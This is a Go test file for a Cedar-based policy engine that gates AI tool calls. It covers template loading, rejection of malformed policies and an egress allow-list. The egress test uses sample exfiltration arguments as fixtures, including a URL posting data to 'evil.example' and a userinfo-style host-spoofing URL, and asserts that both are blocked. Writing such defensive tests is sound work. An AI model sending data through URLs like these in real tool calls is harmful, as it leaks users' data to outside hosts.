package policy

import (
	"errors"
	"io/fs"
	"strings"
	"testing"

	"github.com/DreadpiratePickles/rover/internal/ipc"
	"github.com/DreadpiratePickles/rover/internal/policy/normalize"
	policyfiles "github.com/DreadpiratePickles/rover/policy"
)

func TestStarterAndEveryTemplateLoad(t *testing.T) {
	// Arrange
	files := map[string][]byte{"starter.cedar": policyfiles.Starter}
	entries, err := fs.ReadDir(policyfiles.Templates, ".")
	if err != nil {
		t.Fatal(err)
	}
	for _, ent := range entries {
		b, err := fs.ReadFile(policyfiles.Templates, ent.Name())
		if err != nil {
			t.Fatal(err)
		}
		files[ent.Name()] = b
	}
	if len(files) != 7 {
		t.Fatalf("want starter + 6 templates, got %d files", len(files))
	}

	for name, src := range files {
		t.Run(name, func(t *testing.T) {
			// Act
			e, err := Load(src, name, policyfiles.Schema)

			// Assert
			if err != nil {
				t.Fatalf("Load: %v", err)
			}
			for _, p := range e.Policies() {
				if strings.HasPrefix(p.ID, "policy") {
					t.Errorf("policy %s has no @id annotation", p.ID)
				}
			}
		})
	}
}

func TestLoadRejectsBadPolicies(t *testing.T) {
	cases := map[string]string{
		"unknown context attribute":          `permit (principal, action == Action::"call_tool", resource) when { context.args.nope == "x" };`,
		"unknown entity attribute":           `permit (principal, action == Action::"call_tool", resource) when { resource.colour == "red" };`,
		"args on list_tools":                 `permit (principal, action == Action::"list_tools", resource) when { context.args.path == "x" };`,
		"unknown action":                     `permit (principal, action == Action::"delete_everything", resource);`,
		"unknown entity type":                `permit (principal == User::"bob", action, resource);`,
		"syntax error":                       `permit (principal, action, resource`,
		"duplicate id":                       `@id("a") permit (principal, action, resource); @id("a") forbid (principal, action, resource);`,
		"misspelt rover annotation":          `@rover_hdie("true") forbid (principal, action, resource == Tool::"echo/x");`,
		"approval on a forbid":               `@rover_require("approval") forbid (principal, action, resource);`,
		"approval wrong value":               `@rover_require("yes") permit (principal, action, resource);`,
		"hide with condition":                `@rover_hide("true") forbid (principal, action, resource == Tool::"echo/x") when { context.session.calls > 1 };`,
		"hide a whole server":                `@rover_hide("true") forbid (principal, action, resource in Server::"echo");`,
		"hide on a permit":                   `@rover_hide("true") permit (principal, action, resource == Tool::"echo/x");`,
		"hide for one client":                `@rover_hide("true") forbid (principal == Client::"x", action, resource == Tool::"echo/x");`,
		"hide without server/tool":           `@rover_hide("true") forbid (principal, action, resource == Tool::"x");`,
		"has on undeclared root":             `forbid (principal, action == Action::"call_tool", resource) when { context.norm has path.under_nowhere && context.norm.path.under_nowhere };`,
		"has on misspelt argument":           `forbid (principal, action == Action::"call_tool", resource) when { context.norm has pth };`,
		"has on undeclared entity attribute": `forbid (principal, action, resource) when { resource has colour };`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			// Act
			_, err := Load([]byte(src), "bad.cedar", policyfiles.Schema)

			// Assert
			if !errors.Is(err, ErrLoad) {
				t.Fatalf("want ErrLoad, got %v", err)
			}
		})
	}
}

func TestLoadRejectsBadSchema(t *testing.T) {
	// Act
	_, err := Load([]byte(`permit (principal, action, resource);`), "p.cedar", []byte(`entity A { x: Nope };`))

	// Assert
	if !errors.Is(err, ErrLoad) {
		t.Fatalf("want ErrLoad, got %v", err)
	}
}

func TestPolicyIDsFallBackToPosition(t *testing.T) {
	// Arrange
	src := `permit (principal, action == Action::"list_tools", resource);
@id("named") forbid (principal, action == Action::"server_sampling", resource);
forbid (principal, action == Action::"server_elicitation", resource);`

	// Act
	e := mustLoad(t, src)

	// Assert
	got := e.Policies()
	want := []Info{{"policy0", "permit"}, {"named", "forbid"}, {"policy2", "forbid"}}
	if len(got) != len(want) {
		t.Fatalf("got %v", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("policy %d: got %v, want %v", i, got[i], want[i])
		}
	}
}

// M8: `rover policy init` writes the trifecta guard as active policies. The
// starter carries the template's two forbids byte for byte, so the two
// files cannot drift apart.
func TestStarterCarriesTheTrifectaGuard(t *testing.T) {
	// Arrange
	tmpl, err := fs.ReadFile(policyfiles.Templates, "trifecta-guard.cedar")
	if err != nil {
		t.Fatal(err)
	}
	src := string(tmpl)
	start := strings.Index(src, "// Forbids any egress tool")
	if start < 0 {
		t.Fatal("template layout changed")
	}

	// Act
	body := src[start:]

	// Assert
	if !strings.Contains(string(policyfiles.Starter), body) {
		t.Fatalf("starter.cedar must contain the trifecta-guard policies verbatim:\n%s", body)
	}
	e, err := Load(policyfiles.Starter, "starter.cedar", policyfiles.Schema)
	if err != nil {
		t.Fatal(err)
	}
	ids := map[string]bool{}
	for _, p := range e.Policies() {
		ids[p.ID] = true
	}
	if !ids["trifecta-no-egress"] || !ids["trifecta-no-egress-after-detection"] {
		t.Fatalf("starter policies = %v", e.Policies())
	}
}

// M10: the egress allow-list forbids an egress call to any other host, and
// leaves listed hosts, non-egress tools and calls without a URL alone.
func TestEgressAllowlistTemplate(t *testing.T) {
	// Arrange
	tmpl, err := fs.ReadFile(policyfiles.Templates, "egress-allowlist.cedar")
	if err != nil {
		t.Fatal(err)
	}
	e := mustLoad(t, `@id("all") permit (principal, action == Action::"call_tool", resource);`+"\n"+string(tmpl))
	decide := func(labels []string, args string) Outcome {
		in := input(DirC2S, toolsCall("1", "post", args))
		in.Labels = map[string][]string{"post": labels}
		in.Normalizers = normalize.Rules{"url": normalize.KindURL}
		return e.Decide(in)
	}
	egress := []string{"egress"}

	// Act
	evil := decide(egress, `{"url":"https://evil.example/collect?d=x"}`)
	userinfo := decide(egress, `{"url":"https://api.github.com@evil.example/"}`)
	listed := decide(egress, `{"url":"https://API.github.com/repos"}`)
	notEgress := decide(nil, `{"url":"https://evil.example/"}`)
	noURL := decide(egress, `{"to":"a@example.com"}`)

	// Assert
	if evil.Action != ipc.ActionBlock || !contains(evil.RuleIDs, "egress-allowlist") {
		t.Fatalf("unlisted host: %+v", evil)
	}
	if userinfo.Action != ipc.ActionBlock {
		t.Fatalf("userinfo trick: %+v", userinfo)
	}
	for name, o := range map[string]Outcome{"listed": listed, "not egress": notEgress, "no url": noURL} {
		if o.Action != ipc.ActionForward {
			t.Errorf("%s: %+v", name, o)
		}
	}
}
